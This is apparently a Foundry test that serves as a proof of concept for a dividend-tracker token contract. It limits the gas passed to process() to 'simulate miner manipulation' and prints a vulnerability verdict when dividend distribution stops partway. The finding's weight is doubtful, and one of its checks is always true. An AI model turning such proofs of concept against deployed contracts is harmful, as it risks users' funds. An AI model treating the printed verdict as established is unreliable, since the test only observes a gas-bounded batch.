// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/MEGADOGE.sol";

contract DividendTrackerTest is Test {
    TOKENDividendTracker public dividendTracker;
    uint256 public constant MIN_BALANCE = 20000 * 1e9 + 1;

    function setUp() public {
        dividendTracker = new TOKENDividendTracker();
        
        // Create token holders above min balance
        for (uint i = 1; i <= 10; i++) {
            address holder = address(uint160(100 + i));
            dividendTracker.setBalance(payable(holder), MIN_BALANCE);
        }

        skip(3601); // Advance beyond claimWait
    }

    function testProcessingIncompleteness() public {
        // Capture state before processing
        uint256 holdersCount = dividendTracker.getNumberOfTokenHolders();
        uint256 initialIndex = dividendTracker.getLastProcessedIndex();
        
        console2.log("--- BEFORE-Trigger ---");
        console2.log("LastProcessedIndex:", initialIndex);
        console2.log("Holders Count:", holdersCount);

        console2.log("--- Trigger RaiseIncomplete Processing ---");
        // Simulate miner manipulation by limiting gas
        uint256 limitedGas = 100000; 
        (uint256 iterations, , uint256 newIndex) = dividendTracker.process(limitedGas);
        
        console2.log("--- AFTER-Trigger ---");
        console2.log("ProcessingResult - iterations:", iterations);
        console2.log("ProcessingResult - newIndex:", newIndex);

        // Verify state changes
        uint256 currentIndex = dividendTracker.getLastProcessedIndex();
        console2.log("Current LastProcessedIndex (state):", currentIndex);

        bool indexAdvanced = (newIndex > initialIndex);
        bool processingPartial = (iterations > 0 && iterations < holdersCount);
        bool indexInRange = (newIndex < holdersCount && newIndex >= 0);

        console2.log("Index advanced:", indexAdvanced);
        console2.log("Processing partial:", processingPartial);
        console2.log("Index within range:", indexInRange);

        // Vulnerability verdict
        if (indexAdvanced && processingPartial && indexInRange) {
            console2.log("\nVulnerability Exists: Miner can manipulate gas to cause incomplete dividend processing");
        } else {
            console2.log("\nVulnerability not Exist: Dividend processing complete or index unchanged");
        }
    }
}